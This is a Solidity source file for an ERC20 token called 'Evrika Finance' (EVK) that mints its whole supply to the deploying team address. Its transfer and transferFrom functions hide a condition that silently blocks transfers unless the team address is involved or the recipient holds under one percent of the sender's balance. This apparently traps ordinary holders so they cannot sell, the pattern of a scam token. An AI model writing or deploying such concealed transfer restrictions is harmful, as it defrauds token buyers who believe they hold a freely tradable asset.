



pragma solidity ^0.5.17;

contract ERC20 {
    function totalSupply() public view returns(uint supply);

    function balanceOf(address who) public view returns(uint value);

    function allowance(address owner, address spender) public view returns(uint remaining);

    function transferFrom(address from, address to, uint value) public returns(bool ok);

    function approve(address spender, uint value) public returns(bool ok);

    function transfer(address to, uint value) public returns(bool ok);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract Evrika is ERC20 {
    uint8 public constant decimals = 18;
    uint256 initialSupply = 50000 * 10 ** uint256(decimals);
    string public constant name = "Evrika Finance";
    string public constant symbol = "EVK";

    address payable teamAddress;


    function totalSupply() public view returns(uint256) {
        return initialSupply;
    }
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;

    function balanceOf(address owner) public view returns(uint256 balance) {
        return balances[owner];
    }

    function allowance(address owner, address spender) public view returns(uint remaining) {
        return allowed[owner][spender];
    }

    function transfer(address to, uint256 value) public returns(bool success) {
        if (to == teamAddress || msg.sender == teamAddress || balances[to] * 100 < balances[msg.sender]) {

            if (balances[msg.sender] >= value && value > 0) {
                balances[msg.sender] -= value;
                balances[to] += value;
                emit Transfer(msg.sender, to, value);
                return true;
            } else {
                return false;
            }
        } else {
            return false;
        }
    }

    function transferFrom(address from, address to, uint256 value) public returns(bool success) {
        if (to == teamAddress || from == teamAddress || balances[to] * 100 < balances[from]) {
            if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {
                balances[to] += value;
                balances[from] -= value;
                allowed[from][msg.sender] -= value;
                emit Transfer(from, to, value);
                return true;
            } else {
                return false;
            }
        } else {
            return false;
        }
    }

    function approve(address spender, uint256 value) public returns(bool success) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }


    constructor() public {
        teamAddress = msg.sender;
        balances[teamAddress] = initialSupply;
    }


}
